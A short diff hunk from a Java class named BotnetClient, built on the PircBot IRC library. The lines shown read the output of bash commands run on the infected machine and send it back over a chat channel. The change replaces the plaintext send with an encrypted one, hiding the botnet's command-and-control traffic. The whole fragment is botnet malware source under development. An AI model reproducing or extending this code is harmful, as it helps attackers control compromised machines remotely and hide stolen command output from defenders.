@@ -238,7 +238,8 @@ public class BotnetClient extends PircBot {
 	        				System.out.println("bash response: " + s);
 	        				s = bashout.readLine();
 	        			}
-	        			chat.sendLine(s);
+	        			//chat.sendLine(s);
+	        			chat.sendLine(startMsgE.encryptMsg(s));
 	        		}
 		        	chat.close();
 		        	inputThread.kill();
